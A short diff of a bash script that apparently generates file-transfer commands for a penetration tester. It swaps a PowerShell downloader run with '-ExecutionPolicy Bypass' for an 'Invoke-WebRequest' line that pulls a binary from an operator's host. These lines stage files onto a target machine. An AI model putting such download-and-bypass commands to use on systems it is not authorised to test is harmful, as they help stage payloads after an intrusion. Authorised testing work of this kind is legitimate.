@@ -88,7 +88,7 @@ case $method in
 	 ;;&
      powershell|all)
 	legit=1
-	command=$(echo -e "echo \$storageDir = \$pwd > wget.ps1 && echo \$webclient = New-Object System.Net.WebClient >>wget.ps1 && echo \$url = \"http://$localhost/$binary\" >>wget.ps1 && echo \$file = \"$binary\" >>wget.ps1 && echo \$webclient.DownloadFile(\$url,\$file) >>wget.ps1\npowershell.exe -ExecutionPolicy Bypass -NoLogo -NonInteractive -NoProfile -File wget.ps1");
+	command=$(echo -e "Invoke-WebRequest http://$ip/$binary -OutFile $binary");
         echo $command | xclip -selection clipboard && echo -e "$command\n"
          ;;&
      debug)
